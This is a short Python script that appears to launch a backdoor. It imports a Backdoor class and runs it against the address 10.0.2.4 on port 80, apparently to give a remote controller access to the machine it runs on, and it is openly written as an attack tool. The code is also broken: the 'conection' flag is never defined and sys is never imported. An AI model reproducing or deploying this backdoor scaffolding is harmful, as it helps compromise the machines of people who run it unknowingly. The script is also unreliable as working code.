#!/usr/bin/env python3
from Server import Backdoor

# Checks if the connection on our side is alive or no if yes it will try to call the objects if not it's do nothing basiclly
if conection:
	try:
	    app = Backdoor("10.0.2.4", 80)
	    app.run()
	except Exception as e:
		#send_error(e)
	    sys.exit()


